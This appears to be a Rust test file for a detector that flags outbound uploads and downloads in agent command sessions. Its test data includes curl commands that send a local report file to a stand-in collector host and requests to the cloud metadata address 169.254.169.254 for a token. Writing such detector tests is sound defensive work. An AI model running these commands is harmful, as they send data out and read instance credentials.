use super::*;

/// An imported session's upload commands match the upload rule in session
/// events, as the same commands from a session store do.
#[test]
fn imported_uploads_match_the_upload_rule_in_session_events() {
    for command in IMPORTED_UPLOADS {
        let output = actions(&[command_tool(
            "imported",
            command,
            "2026-09-18T00:00:00Z",
            IngestionMode::Import,
        )]);
        assert!(
            output.sessions()[0]
                .rule_ids()
                .iter()
                .any(|id| id == "exfil.outbound_upload"),
            "{command}"
        );
    }
}

/// Imported commands are not actions: they raise no action finding.
#[test]
fn imported_uploads_raise_no_action_finding() {
    for command in IMPORTED_UPLOADS {
        let output = actions(&[command_tool(
            "imported",
            command,
            "2026-09-18T00:00:00Z",
            IngestionMode::Import,
        )]);
        assert_eq!(output.sessions()[0].action_findings(), [], "{command}");
    }
}

/// The typed reading of an imported command finds an upload, and neither a
/// download nor a command that only names a client.
#[test]
fn the_typed_reading_of_an_imported_command_finds_only_an_upload() {
    let reads = |command| {
        let observation = command_tool(
            "imported",
            command,
            "2026-09-18T00:00:00Z",
            IngestionMode::Import,
        );
        super::super::super::actions::observation_requests_outbound_transfer(
            &observation,
            &super::super::super::session::RetentionBudget::new(),
        )
        .expect("within budget")
    };
    assert!(reads("aws s3 sync ./dist s3://synthetic-bucket/site"));
    assert!(!reads("aws s3 sync s3://synthetic-bucket/site ./dist"));
    assert!(!reads("echo aws s3 sync ./dist s3://synthetic-bucket/site"));
}

#[test]
fn imds_token_request_is_not_a_native_upload() {
    let url = "http://169.254.169.254/latest/api/token";
    let ttl = "'X-aws-ec2-metadata-token-ttl-seconds: 60'";
    let other = "https://collector.example.invalid/upload";
    let lookup = "curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/placement/region";
    let token = format!("TOKEN=$(curl -s -X PUT -H {ttl} {url})");
    for (command, download, upload) in [
        // The exclusion reads each native stage, which keeps its whitespace.
        (format!("curl -X PUT -H {ttl} {url}"), false, false),
        (format!("curl -sS -XPUT {url} -H {ttl}"), false, false),
        (token.clone(), false, false),
        (format!("{token}; {lookup}"), true, false),
        (
            format!("echo start; curl -X PUT -H {ttl} {url}"),
            false,
            false,
        ),
        (
            format!("wget -qO- --method=PUT --header={ttl} {url}"),
            false,
            false,
        ),
        // Anything beyond the bodyless request stays an upload.
        (
            format!("curl -X PUT -d @report.txt -H {ttl} {url}"),
            false,
            true,
        ),
        (
            format!("curl -X PUT -T report.txt -H {ttl} {url}"),
            false,
            true,
        ),
        (format!("curl -X PUT -H {ttl} {url} {other}"), false, true),
        (
            format!("curl -X PUT -H {ttl} https://collector.example.invalid/latest/api/token"),
            false,
            true,
        ),
        (
            format!("curl -X PUT -H {ttl} http://169.254.169.254/latest/meta-data/x"),
            false,
            true,
        ),
        (format!("curl -X POST -H {ttl} {url}"), false, true),
        (
            format!("{token}; curl --data @report.txt {other}"),
            false,
            true,
        ),
        (
            format!("{token} & curl -d @report.txt {other}"),
            false,
            true,
        ),
        (format!("curl -X PUT {other}"), false, true),
    ] {
        let output = actions(&[tool("imds", &command, Some("2026-09-17T00:00:00Z"))]);
        let findings = output.sessions()[0].action_findings();
        let matches = |rule: &str| {
            findings
                .iter()
                .any(|finding| finding.rule_ids().iter().any(|id| id == rule))
        };
        assert_eq!(matches("network.download"), download, "{command}");
        assert_eq!(matches("exfil.outbound_upload"), upload, "{command}");
    }
}

#[test]
fn wget_flags_that_take_no_value_keep_a_native_upload() {
    let command = "wget --method=PUT -m 3405803786";
    let output = actions(&[tool("imds", command, Some("2026-09-17T00:00:00Z"))]);
    let findings = output.sessions()[0].action_findings();
    assert!(
        findings.iter().any(|finding| finding
            .rule_ids()
            .iter()
            .any(|id| id == "exfil.outbound_upload")),
        "{command}"
    );
}
